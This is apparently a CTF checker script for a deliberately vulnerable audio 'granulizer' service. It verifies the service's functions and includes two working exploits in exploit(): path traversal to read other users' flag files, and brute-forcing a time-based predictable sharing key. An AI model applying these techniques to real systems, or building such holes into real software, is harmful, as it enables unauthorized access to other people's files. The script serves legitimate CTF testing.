#!/usr/bin/env python3
from enochecker import BaseChecker, BrokenServiceException, EnoException, run
from enochecker.utils import SimpleSocket, assert_equals, assert_in
import random
import os
import string
import wave
import base64
import json
import re
import itertools
import hashlib
import time

#### Checker Tenets
# A checker SHOULD not be easily identified by the examination of network traffic => This one is not satisfied, because our usernames and notes are simple too random and easily identifiable.
# A checker SHOULD use unusual, incorrect or pseudomalicious input to detect network filters => This tenet is not satisfied, because we do not send common attack strings (i.e. for SQL injection, RCE, etc.) in our notes or usernames.
####

flag_file_name = "flag.pcm"

class GranulizerChecker(BaseChecker):
    """
    Change the methods given here, then simply create the class and .run() it.
    Magic.
    A few convenient methods and helpers are provided in the BaseChecker.
    ensure_bytes ans ensure_unicode to make sure strings are always equal.
    As well as methods:
    self.connect() connects to the remote server.
    self.get and self.post request from http.
    self.chain_db is a dict that stores its contents to a mongodb or filesystem.
    conn.readline_expect(): fails if it's not read correctly
    To read the whole docu and find more goodies, run python -m pydoc enochecker
    (Or read the source, Luke)
    """

    ##### EDIT YOUR CHECKER PARAMETERS
    flag_variants = 1
    noise_variants = 3
    havoc_variants = 2
    exploit_variants = 2

    service_name = "granulizer"
    port = 2345  # The port will automatically be picked up as default by self.connect and self.http.
    ##### END CHECKER PARAMETERS

    def register_user(self, conn: SimpleSocket, username: str, password: str):
        self.debug(
            f"Sending command to register user: {username} with password: {password}"
        )

        conn.write(f"r\n")
        conn.readline_expect(
            b"Username: ",
            read_until=b": ",
            exception_message="Failed to enter register command"
        )

        conn.write(f"{username}\n")
        conn.readline_expect(
            b"Password: ",
            read_until=b"Password: ",
            exception_message="Failed to enter user name"
        )

        conn.write(f"{password}\n")
        conn.readline_expect(
            b"ok",
            read_until=b"ok",
            exception_message="Failed to register user"
        )

    def logout(self, conn: SimpleSocket):
        conn.write(f"quit\n")
        conn.close()

    def login_user(self, conn: SimpleSocket, username: str, password: str):
        self.debug(f"Sending command to login.")
        
        conn.write(f"l\n")

        conn.readline_expect(
            b"Username: ",
            read_until=b": ",
            exception_message="Failed to enter register command"
        )

        conn.write(f"{username}\n")
        conn.readline_expect(
            b"Password: ",
            read_until=b"Password: ",
            exception_message="Failed to enter unter name"
        )

        conn.write(f"{password}\n")

        conn.readline_expect(
            b"What do you want to do?",
            read_until=b"> ",
            exception_message="User checking failed"
        )


    def granulize_file(self, conn: SimpleSocket, filename: str, username: str, filetype: str):
        self.debug(f"Try to granulize file {filename}\n")
    
        conn.write(f"granulize\n")
        conn.readline_expect(
            b"Enter a file name: ",
            read_until=b"Enter a file name: ",
            exception_message="Failed to enter 'granulize' command"
        )

        conn.write(f"{filename}\n")
        
        expect_str = "written to file users/{}/granulized.{}\nWhat do you want to do?\n > ".format(username, filetype)
        conn.readline_expect(
            expect_str,
            read_until=expect_str,
            exception_message="Failed to granulize"
        )

        self.debug("Granulized successfully!\n")

    def generate_wav_random(self):
        filename = "output.wav"
        nchannels = 1
        sampwidth = 1  # 8-bit
        framerate = 16000
        nframes = framerate * 1  # 5 seconds

        w = wave.open(filename, 'w')
        w.setparams((nchannels, sampwidth, framerate, nframes, 'NONE', 'not compressed'))

        # Generate random audio data
        data = bytearray([random.randint(0, 255) for _ in range(nframes)])

        w.writeframes(data)
        w.close()

        with open(filename, 'rb') as fd:
            contents = fd.read()
        return contents
    

    def put_wav_random(self, conn: SimpleSocket, filename: str):
        conn.write(f"upload wav\n")
        conn.readline_expect(
            b"Enter file name for new file: ",
            read_until=b"Enter file name for new file: ",
            exception_message="Failed to enter 'upload wav' command"
        )
        conn.write(f"{filename}\n")
        conn.readline_expect(
            b"Enter base64 encoded wave file (maximum 4kB bytes long)\n",
            read_until=b"Enter base64 encoded wave file (maximum 4kB bytes long)\n",
            exception_message="Failed to enter file name"
        )

        wav_data = self.generate_wav_random()
        #write wav
        wav_bytes = base64.b64encode(wav_data)
        wavb64 = wav_bytes.decode('utf-8')        
        conn.write(f"{wavb64}\n")
        conn.readline_expect(
            b"Success\n",
            read_until=b"Success\n",
            exception_message="B64 encoded flag writing did not work"
        )
        return wav_data

        
    #checker has to login before put_pcm is called
    def put_pcm(self, conn: SimpleSocket, filename: str, pcm_data: str):
        self.debug(f"Put .pcm file as flag")

        conn.write(f"upload pcm\n")
        conn.readline_expect(
            b"Enter file name for new file: ",
            read_until=b"Enter file name for new file: ",
            exception_message="Failed to enter 'upload pcm' command"
        )

        conn.write(f"{filename}\n")
        conn.readline_expect(
            b"Enter base64 encoded wave file (maximum 4kB bytes long)\n",
            read_until=b"Enter base64 encoded wave file (maximum 4kB bytes long)\n",
            exception_message="Failed to enter file name"
        )

        #write flag as file
        flagb64_bytes = base64.b64encode(pcm_data.encode('utf-8'))
        flagb64 = flagb64_bytes.decode('utf-8')        
        conn.write(f"{flagb64}\n")
        conn.readline_expect(
            b"Success\n",
            read_until=b"Success\n",
            exception_message="B64 encoded flag writing did not work"
        )
    
    #downloads a shared pcm from another user into own granulized.pcm
    def get_shared_pcm(self, conn: SimpleSocket, user: str, filename: str, key: str, ignoreErrors=False) -> bytearray:
        self.debug(f"Get shared .pcm file")
        conn.write(f"sharing use key\n")
        conn.readline_expect(
            b"Access user: ",
            read_until=b"Access user: ",
            exception_message="Unexpected message from server for using shared key"
        )
        conn.write(f"{user}\n")
        conn.readline_expect(
            b"Access key: ",
            read_until=b"Access key: ",
            exception_message="Unexpected message from server for using shared key"
        )
        conn.write(f"{key}\n")
        conn.readline_expect(
            b"Which file would you like to access: ",
            read_until=b"Which file would you like to access: ",
            exception_message="Unexpected message from server for using shared key"
        )
        conn.write(f"{filename}\n")
        line = conn.read_n_lines(1)
        line = line[0]
        line = line.decode('utf-8')

        if "written to file" not in line:
            if not ignoreErrors:
                raise EnoException("Failed to access shared .pcm file")
            else:
                conn.read_until(f">")
                return False
            
        conn.read_until(f">")
        return True
    
    def get_pcm(self, conn: SimpleSocket, filename: str) -> bytearray:
        self.debug(f"Get .pcm file")

        conn.write(f"download pcm\n")
        conn.readline_expect(
            b"Filename: ",
            read_until=b"Filename: ",
            exception_message="Failed to enter file name"
        )

        conn.write(f"{filename}\n")

        conn.readline()
        conn.readline() #TODO add timeout
        base64_b = conn.readline()
        file_content_b = base64.decodebytes(base64_b)
        
        conn.readline()

        return file_content_b
    
    def get_wav(self, conn: SimpleSocket, filename: str) -> bytearray:
        self.debug(f"Get .wav file")

        conn.write(f"download wav\n")
        conn.readline_expect(
            b"Filename: ",
            read_until=b"Filename: ",
            exception_message="Failed to enter file name"
        )

        conn.write(f"{filename}\n")

        conn.readline()
        conn.readline() #TODO add timeout
        base64_b = conn.readline()
        file_content_b = base64.decodebytes(base64_b)
        
        conn.readline()

        return file_content_b


    def set_option_granular_rate(self, conn: SimpleSocket, value: int):
        #set granular rate
        conn.write(f"set option granular_rate\n")
        conn.readline_expect(
            b"Number of grains per second: (default 10) ",
            read_until=b"Number of grains per second: (default 10) ",
            exception_message="Unexpected answer in setting options"
        )
        conn.write(f"{value}\n")
        conn.readline_expect(
            b" > ",
            read_until=b" > ",
            exception_message="Unexpected answer in setting options"
        )
    
    def set_option_grain_length(self, conn: SimpleSocket, value: int):
        #set grain length
        conn.write(f"set option grain timelength\n")
        conn.readline_expect(
            b"New timelength of sample: (default 2) ",
            read_until=b"New timelength of sample: (default 2) ",
            exception_message="Unexpected answer in setting options"
        )
        conn.write(f"{value}\n")
        conn.readline_expect(
            b" > ",
            read_until=b" > ",
            exception_message="Unexpected answer in setting options"
        )

    def set_option_volume(self, conn: SimpleSocket, value: int):
        #set option volume
        conn.write(f"set option volume\n")
        conn.readline_expect(
            b"New volume of sample: (default 100) ",
            read_until=b"New volume of sample: (default 100) ",
            exception_message="Unexpected answer in setting options"
        )
        conn.write(f"{value}\n")
        conn.readline_expect(
            b" > ",
            read_until=b" > ",
            exception_message="Unexpected answer in setting options"
        )

    def set_random_options(self, conn: SimpleSocket):
        option_granular_rate = random.randint(2, 200)
        option_grain_length = random.randint(1, 10)
        option_volume = random.randint(1, 100)

        if random.choice([True, False]): #little bit of randomization of settings
            self.set_option_granular_rate(conn, option_granular_rate)
        if random.choice([True, False]):
            self.set_option_grain_length(conn, option_grain_length)
        if random.choice([True, False]):
            self.set_option_volume(conn, option_volume)


    def flatten(self, lst):
        return list(itertools.chain(*[self.flatten(i) if isinstance(i, list) else [i] for i in lst]))

    def reverse_pcm(self, bytes_in: bytearray, granular_number_samples: int, granular_order_samples,
        granular_order_timelens, granular_order_buffer_lens):
        self.info("Reverse PCM Logging:")
        self.info(bytes_in)
        self.info("Num Samples:")
        self.info(granular_number_samples)
        self.info("Order Samples:")
        self.info(granular_order_samples)
        self.info("Order timelens:")
        self.info(granular_order_timelens)
        self.info("Order buffer lens:")
        self.info(granular_order_buffer_lens)
        
        grain_offset = 0
        grains_list = {}
        for i in range(granular_number_samples): #reconstruct grains with correct length
            this_grain_orig_pos = granular_order_samples[i]
            this_grain_timelen = granular_order_timelens[i] #time shift
            #number original bytes
            this_grain_len = (int) (granular_order_buffer_lens[this_grain_orig_pos] / this_grain_timelen)

            orig_grain = [0] * this_grain_len #init empty array for this grain
            
            for g in range(this_grain_len):
                index_read = g * this_grain_timelen + grain_offset
                orig_grain[g] = bytes_in[index_read]

            #second * this_grain_timelen is necessary to skip the smoothing grains in between correct data
            grain_offset += this_grain_timelen * this_grain_len
            grain_offset += this_grain_timelen
            #grain_offset = grain_offset + this_grain_timelen * this_grain_len * this_grain_timelen
            grains_list[this_grain_orig_pos] = orig_grain #add reconstructed grain to list
            
        #reconstruct order of grains
        orig_data = []
        for i in range(granular_number_samples):
            orig_data.append(grains_list.get(i))
        orig_data = self.flatten(orig_data)
        #convert into string:
        d = bytes(orig_data)
        utf8_str = d.decode('utf-8')
        return utf8_str

    def helper_parse_bytearray(self, byte_array):
        # Convert bytearray to string
        string = byte_array.decode('utf-8')
        
        # Split the string by the equal sign and get the value after it
        value_string = string.split('=')[1].strip()
        
        # Convert the value string to an integer
        value_int = int(value_string)
        
        return value_int


    def helper_parse_bytearray_to_list(self, byte_array):
        # Convert bytearray to string
        byte_string = byte_array.decode()
        
        # Extract list of integers from string
        match = re.search(r'\[([\d,\s]+)\]', byte_string)
        if match:
            int_string = match.group(1)
        else:
            raise ValueError("No list of integers found in byte array")
        
        # Convert string of integers to list of integers
        int_list = list(map(int, int_string.split(',')))
        
        return int_list


    def granulize_info(self, conn: SimpleSocket):
        self.debug(f"Try to get granulize info")

        conn.write(f"granulize info\n")
        #Data from server should look like this:
        #granular_number_samples = 5
        #granular_order_samples = [4,2,0,1,3]
        #granular_order_timelens = [2,2,2,2,2]
        #granular_order_buffer_lens = [4,4,4,4,7]
        granular_number_samples_b = conn.readline()
        granular_order_samples_b = conn.readline()
        granular_order_timelens_b = conn.readline()
        granular_order_buffer_lens_b = conn.readline()
        
        conn.readline_expect(
            b"What do you want to do?",
            #b" > ",
            read_until=b"> ",
            exception_message="Wrong output for granulize info"
        )
        back = {}

        #convert:
        back['granular_number_samples'] = self.helper_parse_bytearray(granular_number_samples_b) #TODO problem
        back['granular_order_samples'] = self.helper_parse_bytearray_to_list(granular_order_samples_b)
        back['granular_order_timelens'] = self.helper_parse_bytearray_to_list(granular_order_timelens_b)
        back['granular_order_buffer_lens'] = self.helper_parse_bytearray_to_list(granular_order_buffer_lens_b)

        return back

    def generate_cool_username(self):
        #generates cool usernames! (thx chatGPT for the code)

        # List of adjectives        
        adjectives = ['Analog', 'Vintage', 'Modular', 'Buzzy', 'Warm', 'Saturated', 'Characterful', 'Organic', 'Textured', 'Gritty', 'Grungy', 'LoFi', 'Tape', 'Wobbly', 'Mellow', 'Melodic', 'Harmonic', 'Smooth', 'Liquid', 'Deep', 'Groovy', 'Fuzzy', 'Funky', 'Growling', 'Whirling', 'Breathy', 'Expressive', 'Resonant', 'Lush', 'Vibrant', 'Luminous', 'Dreamy', 'Sweeping', 'Hypnotic', 'Immersive', 'Spatial', 'Expansive', 'Enveloping', 'Ambient', 'Textural', 'Wavering', 'Shimmering', 'Glitchy', 'Noisy', 'Chaotic', 'Energetic', 'Dynamic', 'Driving', 'Powerful', 'Impactful', 'Harsh', 'Wild', 'Unfiltered', 'Roaring', 'Rumbling', 'Intense', 'Analogous', 'Otherworldly', 'Unconventional', 'Experimental', 'Uncharted', 'Unorthodox', 'Innovative', 'AvantGarde']
        # List of nouns
        nouns = ['Synth', 'Beat', 'Sound', 'Wave', 'Groove', 'Patch', 'Filter', 'Sequence', 'LFO', 'Sampler', 'Drum', 'Bass', 'Lead', 'Modulation', 'Chord', 'Sequence', 'Noise', 'Effect', 'Envelope', 'Arpeggio', 'Beethoven', 'Mozart', 'Bach', 'Chopin', 'Mendelssohn', 'Schubert', 'Handel', 'Haydn', 'Vivaldi', 'Tchaikovsky', 'Verdi', 'Stravinsky', 'Mahler', 'Debussy', 'Rachmaninoff', 'Brahms', 'Schumann', 'Puccini', 'Liszt', 'Prokofiev', 'Sibelius', 'Grieg', 'Ravel', 'SaintSaens', 'Bizet', 'Shostakovich', 'Berlioz', 'Dvorak', 'Orff', 'Schoenberg', 'Bartok', 'Haendel', 'Pergolesi', 'Palestrina', 'Corelli', 'Purcell', "AdaLovelace", "GraceHopper", "JeanESammet", "BarbaraLiskov", "FranAllen", "RadiaPerlman", "KarenSpaerckJones", "LynnConway", "MargaretHamilton", "ElisabethHendrickson", "JenniferWidom", "DaphneKoller", "GladysWest", "RuthLichtermanTeitelbaum", "KatherineJohnson", "EllenOchoa", "ThelmaEstrin", "KathleenMcKeown", "BrendaLaurel", "GillianCramptonSmith", "LeslieLamport", "EllenUllman"]

        adjective = random.choice(adjectives)
        noun = random.choice(nouns)
        username = adjective + noun + str(random.randint(0, 9999))

        return username       

    def generate_random_user(self):
        # First we need to register a user. So let's create some random strings. (Your real checker should use some funny usernames or so)
        username = self.generate_cool_username()
        password: str = "".join(
            random.choices(string.ascii_uppercase + string.digits, k=12)
        )
        return username, password

    def generate_random_pcm_content(self):
        length = random.randint(8, 1024 * 50)
        random_bytes = os.urandom(length)
        return random_bytes
    
    def generate_random_printable_pcm_content(self) -> str:
        # Generate a random printable string of a given length
        length = random.randint(10, 4096)
        random_string = ''.join(random.choice(string.printable) for _ in range(length))
        return random_string
    
    def generate_random_filename(self) -> str:
        # Generate a random printable string of a given length
        length = random.randint(5, 16)
        random_string = ''.join(random.choice(string.ascii_lowercase) for _ in range(length))
        return random_string
    
    def generate_random_filename_pcm(self) -> str:
        name = self.generate_random_filename()
        name += '.pcm'
        return name

    def generate_random_filename_wav(self) -> str:
        name = self.generate_random_filename()
        name += '.wav'
        return name

    def active_key_sharing(self, conn: SimpleSocket) -> str:
        conn.write(f"sharing allow\n")
        line = conn.read_n_lines(1)
        line = line[0].decode('utf-8')
        key = line.split(" ")[2]
        key = key.replace('\n', '')
        self.debug("Key: ")
        self.debug(key)
        if (len(key) != 64):
            raise EnoException("Unexpected key length of not 64 read from server")
        return key

    def putflag(self):  # type: () -> None
        """
        This method stores a flag in the service.
        In case multiple flags are provided, self.variant_id gives the appropriate index.
        The flag itself can be retrieved from self.flag.
        On error, raise an Eno Exception.
        :raises EnoException on error
        :return this function can return a result if it wants
                if nothing is returned, the service status is considered okay.
                the preferred way to report errors in the service is by raising an appropriate enoexception
        """
        if self.variant_id == 0:
            username, password = self.generate_random_user()

            # Log a message before any critical action that could raise an error.
            self.debug(f"Connecting to service")
            # Create a TCP connection to the service.
            conn = self.connect()
            conn.read_until(f">")

            # Register a new user
            self.register_user(conn, username, password)

            # Now we need to login
            self.login_user(conn, username, password)

            #activate key sharing for this user
            self.active_key_sharing(conn)

            # Put flag (.pcm file)
            self.debug("Put flag:")
            self.debug(self.flag)
            self.put_pcm(conn, flag_file_name, self.flag)
            
            # Save the generated values for the associated getflag() call.
            # This is not a real dictionary! You cannot update it (i.e., self.chain_db["foo"] = bar) and some types are converted (i.e., bool -> str.). See: https://github.com/enowars/enochecker/issues/27
            self.chain_db = {
                "username": username,
                "password": password
            }
            
            self.logout(conn)
            
            return json.dumps({
                "user_name": username,
                "file_name": flag_file_name
            })
        else:
            raise EnoException("Wrong variant_id provided")


    def getflag(self):  # type: () -> None
        """
        This method retrieves a flag from the service.
        Use self.flag to get the flag that needs to be recovered and self.round to get the round the flag was placed in.
        On error, raise an EnoException.
        :raises EnoException on error
        :return this function can return a result if it wants
                if nothing is returned, the service status is considered okay.
                the preferred way to report errors in the service is by raising an appropriate enoexception
        """
        if self.variant_id == 0:
            # First we check if the previous putflag succeeded!
            try:
                username: str = self.chain_db["username"]
                password: str = self.chain_db["password"]
            except Exception as ex:
                self.debug(f"error getting notes from db: {ex}")
                raise BrokenServiceException("Previous putflag failed.")

            self.debug(f"Connecting to the service")
            conn = self.connect()
            conn.read_until(f">")

            # Let's login to the service
            self.login_user(conn, username, password)

            # Let´s obtain our flag
            flag_b = self.get_pcm(conn, flag_file_name)
            flag = flag_b.decode('utf-8')

            #control that it is correct
            if (flag != self.flag):
                raise BrokenServiceException("flags are not similar!")

            self.logout(conn)
        else:
            raise EnoException("Wrong variant_id provided")

    def putnoise(self):
        if self.variant_id == 0: #upload random PCM file
            username, password = self.generate_random_user()

            self.debug(f"Connecting to service")

            conn = self.connect()
            conn.read_until(f">")

            self.register_user(conn, username, password)
            self.login_user(conn, username, password)
            
            self.set_random_options(conn)

            data = self.generate_random_printable_pcm_content()
            filename = self.generate_random_filename_pcm()
            self.put_pcm(conn, filename, data)

            #store data for getnoise 0
            self.chain_db = {
                "noise0-user": username,
                "noise0-pwd": password,
                "noise0-filename": filename,
                'noise0-data': data
            }
            self.logout(conn)
        elif self.variant_id == 1:
            #test for functionality of sharing granulized files
            #puts a random pcm file and shares this account
            username, password = self.generate_random_user()

            self.debug(f"Connecting to service")

            conn = self.connect()
            conn.read_until(f">")

            self.register_user(conn, username, password)
            self.login_user(conn, username, password)

            key = self.active_key_sharing(conn)

            self.set_random_options(conn)

            data = self.generate_random_printable_pcm_content()
            filename = self.generate_random_filename_pcm()
            self.put_pcm(conn, filename, data)

            #store data for getnoise 1
            self.chain_db = {
                "noise1-user": username,
                "noise1-pwd": password,
                "noise1-filename": filename,
                'noise1-data': data,
                'noise1-key': key
            }
            self.logout(conn)
        elif self.variant_id == 2:
            #put wave file
            username, password = self.generate_random_user()

            self.debug(f"Connecting to service")

            conn = self.connect()
            conn.read_until(f">")

            self.register_user(conn, username, password)
            self.login_user(conn, username, password)
            
            self.set_random_options(conn)

            filename = self.generate_random_filename_wav()
            data = self.put_wav_random(conn, filename)
            
            #store data for getnoise 0
            self.chain_db = {
                "noise2-user": username,
                "noise2-pwd": password,
                "noise2-filename": filename,
                'noise2-data': data
            }
            self.logout(conn)
        else:
            raise EnoException("Wrong variant_id provided")

    def getnoise(self):
        if self.variant_id == 0: #upload random PCM file
            # First we check if the previous putflag succeeded!
            try:
                username: str = self.chain_db["noise0-user"]
                password: str = self.chain_db["noise0-pwd"]
                filename: str = self.chain_db["noise0-filename"]
                data: str = self.chain_db["noise0-data"]
            except Exception as ex:
                self.debug(f"error getting notes from db: {ex}")
                raise BrokenServiceException("Previous putnoise failed.")
            
            #login
            conn = self.connect()
            conn.read_until(f">")
            self.login_user(conn, username, password)
            #it is important to NOT choose a volume level other than 1
                #self.set_random_options(conn)
            self.granulize_file(conn, filename, username, "pcm")

            #check if file is correctly reversible
            data_service_granulized = self.get_pcm(conn, "granulized.pcm")
            #Get granulize parameters
            granulize_params = self.granulize_info(conn)
            data_number_samples = granulize_params['granular_number_samples'] 
            data_order_samples = granulize_params['granular_order_samples']
            data_order_timelens = granulize_params['granular_order_timelens']
            data_buffer_lens = granulize_params['granular_order_buffer_lens']
            #reverse
            reversed = self.reverse_pcm(
                data_service_granulized, 
                data_number_samples,
                data_order_samples,
                data_order_timelens,
                data_buffer_lens)
            #check if reversed is original file
            if reversed != data:
                self.info("Failed for:")
                self.info(username)
                self.info(filename)
                self.info("Reversed data:")
                self.info(reversed)
                self.info("Original data:")
                self.info(data)
                self.error("Data is not reversed file, in noise variant 0")
                raise BrokenServiceException("Unexpected granular data retreived")
            self.debug("Reversed noise looks good")

            #check if original file is still available
            data_service_orig = self.get_pcm(conn, filename)
            data_service_orig = data_service_orig.decode('ascii')
            
            if data_service_orig != data:
                raise BrokenServiceException("Unexpected uploaded data retreived")
            self.debug("Original data noise looks good")

            self.logout(conn)
        elif self.variant_id == 1: #test for functionality of sharing granulized files
            try:
                username: str = self.chain_db["noise1-user"]
                password: str = self.chain_db["noise1-pwd"]
                filename: str = self.chain_db["noise1-filename"]
                data: str     = self.chain_db["noise1-data"]
                key: str      = self.chain_db["noise1-key"]
            except Exception as ex:
                self.debug(f"error getting notes from db: {ex}")
                raise BrokenServiceException("Previous putnoise failed.")

            conn = self.connect()
            conn.read_until(f">")

            #register as a new random user
            usernamenew, passwordnew = self.generate_random_user()
            self.register_user(conn, usernamenew, passwordnew)

            self.login_user(conn, usernamenew, passwordnew)
            
            self.get_shared_pcm(conn, username, filename, key)
            #Get granulize parameters
            granulize_params = self.granulize_info(conn)
            #Get pcm file
            data_service_granulized = self.get_pcm(conn, "granulized.pcm")
            self.logout(conn)
            data_number_samples = granulize_params['granular_number_samples'] 
            data_order_samples = granulize_params['granular_order_samples']
            data_order_timelens = granulize_params['granular_order_timelens']
            data_buffer_lens = granulize_params['granular_order_buffer_lens']
            #reverse
            reversed = self.reverse_pcm(
                data_service_granulized, 
                data_number_samples,
                data_order_samples,
                data_order_timelens,
                data_buffer_lens)
            #check if reversed is original file
            if reversed != data:
                self.info("Failed for:")
                self.info(username)
                self.info(filename)
                self.info("Reversed data:")
                self.info(reversed)
                self.info("Original data:")
                self.info(data)
                self.error("Data is not reversed file, in noise variant 1")
                raise BrokenServiceException("Unexpected granular data retreived")
            self.debug("Reversed noise looks good")
        elif self.variant_id == 2:
            # First we check if the previous putflag succeeded!
            try:
                username: str = self.chain_db["noise2-user"]
                password: str = self.chain_db["noise2-pwd"]
                filename: str = self.chain_db["noise2-filename"]
                data:     str = self.chain_db["noise2-data"]
            except Exception as ex:
                self.debug(f"error getting notes from db: {ex}")
                raise BrokenServiceException("Previous putnoise failed.")
            
            #login
            conn = self.connect()
            conn.read_until(f">")

            self.login_user(conn, username, password)
            self.granulize_file(conn, filename, username, "wav")

            #check if file is correctly reversible
            data_service_granulized = self.get_wav(conn, "granulized.wav")
            #Get granulize parameters
            granulize_params = self.granulize_info(conn)
            #here no deep checking or reversing of the .wav file is performed
            #only really rough check:
            if len(data_service_granulized) < len(data):
                raise BrokenServiceException("Unexpected granulized wav data retrieved")

            #check if original file is still available
            data_service_orig = self.get_wav(conn, filename)
            
            if data_service_orig != data:
                raise BrokenServiceException("Unexpected uploaded data retrieved")
            self.debug("Original data noise looks good")

            self.logout(conn)


        else:
            raise EnoException("Wrong variant_id provided")
    
    def havoc(self):
        if self.variant_id == 0:
            #failed login
            
            username, password = self.generate_random_user()
            #username = 'a'
            #password = 'a'
            # Create a TCP connection to the service.
            conn = self.connect(timeout = 1)
            conn.read_until(f">")

            try:
                self.login_user(conn, username, password)
            except Exception: #all good
                return
            #not good
            raise BrokenServiceException("Invalid login worked")
        elif self.variant_id == 1:
            #random strings
            size = random.randint(2, 128)
            # Generate a random string using uppercase letters and digits
            conn = self.connect(timeout = 1)
            conn.read_until(f">")
            res = ''.join(random.choices(string.ascii_uppercase + string.digits, k=size))
            conn.write(res.encode('utf-8'))
            if bool(random.getrandbits(1)):
                conn.write(f'\n')
            try:
                conn.readline_expect("Please enter login or register\nHello! Do you want to login (l) or register (r)?\n > ",
                                 "Please enter login or register\nHello! Do you want to login (l) or register (r)?\n > ")
            except Exception:
                return #good
            
            raise BrokenServiceException("Unexpected answer for wrong input: {}".format(data))
            
        else:
            raise EnoException("Wrong variant_id provided")
    
    def get_time_minutes(self) -> int:
        t = int(time.time())
        t = t // 100 #only minutes
        return t
    
    def exploit(self):
        """
        This method was added for CI purposes for exploits to be tested.
        Will (hopefully) not be called during actual CTF.
        :raises EnoException on Error
        :return This function can return a result if it wants
                If nothing is returned, the service status is considered okay.
                The preferred way to report Errors in the service is by raising an appropriate EnoException
        """
        if self.variant_id == 0:

            #login as some user
            
            #granulize ../{user}/flag.pcm
            #download pcm
            #flag.pcm

            #reverse

            #check
            #hash flag!
            attack_info = json.loads(self.attack_info)
            user_name_exploit = attack_info['user_name']
            file_name_exploit = attack_info['file_name']

            username, password = self.generate_random_user()

            # Log a message before any critical action that could raise an error.
            self.debug(f"Connecting to service")
            # Create a TCP connection to the service.
            conn = self.connect()
            conn.read_until(f">")

            # Register a new random user for exploiting
            self.register_user(conn, username, password)

            # Now we need to login
            self.login_user(conn, username, password)

            # Granulize file of user to be exploited
            path_traversal = "../{user_name}/{file_name}".format(user_name=user_name_exploit, file_name = file_name_exploit)
            self.granulize_file(conn, path_traversal, username, "pcm")

            #Get granulize parameters
            granulize_params = self.granulize_info(conn)

            #get file for reversing
            data = self.get_pcm(conn, "granulized.pcm")
            data_number_samples = granulize_params['granular_number_samples'] 
            data_order_samples = granulize_params['granular_order_samples']
            data_order_timelens = granulize_params['granular_order_timelens']
            data_buffer_lens = granulize_params['granular_order_buffer_lens']
            #reverse
            reversed = self.reverse_pcm(
                data, 
                data_number_samples,
                data_order_samples,
                data_order_timelens,
                data_buffer_lens)
            #build hash of this flag and compare
            flag_hash_got = hashlib.sha256(reversed.encode()).hexdigest()
            self.debug(flag_hash_got)
            self.debug(self.flag_hash)

            if flag_hash_got != self.flag_hash:
                raise BrokenServiceException("Flag is not correct")
            self.debug("Correct hash!")
            
            self.logout(conn)

            return reversed
        elif self.variant_id == 1:
            attack_info = json.loads(self.attack_info)
            user_name_exploit = attack_info['user_name']
            file_name_exploit = attack_info['file_name']
            
            for i in range(15): #test keys for the last 15 minutes
                try:
                    # Log a message before any critical action that could raise an error.
                    self.debug(f"Connecting to service for exploit 1")
                    # Create a TCP connection to the service.
                    conn = self.connect()
                    conn.read_until(f">")

                    username, password = self.generate_random_user()


                    # Register a new random user for exploiting
                    self.register_user(conn, username, password)

                    # Now we need to login
                    self.login_user(conn, username, password)
                    #Generate key for user to be exploited
                    t = self.get_time_minutes()
                    t -= i #try minutes before that too
                    t_str = str(t)
                    key = t_str + user_name_exploit
                    self.debug("Key to be exploited: ")
                    self.debug(key)
                    
                    #hash the key
                    key_hash = hashlib.sha256(key.encode('utf-8')).hexdigest()
                    self.debug("Hashed key")
                    self.debug(key_hash)

                    #try this key
                    worked = self.get_shared_pcm(conn, user_name_exploit, file_name_exploit, key_hash, ignoreErrors=True)
                    if not worked: #try next possible key
                        continue

                    #Get granulize parameters
                    granulize_params = self.granulize_info(conn)

                    #get file for reversing
                    data = self.get_pcm(conn, "granulized.pcm")
                    data_number_samples = granulize_params['granular_number_samples'] 
                    data_order_samples = granulize_params['granular_order_samples']
                    data_order_timelens = granulize_params['granular_order_timelens']
                    data_buffer_lens = granulize_params['granular_order_buffer_lens']
                    #reverse
                    reversed = self.reverse_pcm(
                        data, 
                        data_number_samples,
                        data_order_samples,
                        data_order_timelens,
                        data_buffer_lens)
                    #build hash of this flag and compare
                    flag_hash_got = hashlib.sha256(reversed.encode()).hexdigest()
                    self.debug(flag_hash_got)
                    self.debug(self.flag_hash)

                    if flag_hash_got != self.flag_hash:
                        raise BrokenServiceException("Flag is not correct")
                    self.debug("Correct hash!")
                    self.logout(conn)
                    
                    return reversed
                except:
                    self.warning("Exploit for time -{} did not work".format(i))

        else:
            raise EnoException("Wrong variant_id provided: {}".format(self.variant_id))


app = GranulizerChecker.service  # This can be used for uswgi.
if __name__ == "__main__":
    run(GranulizerChecker)
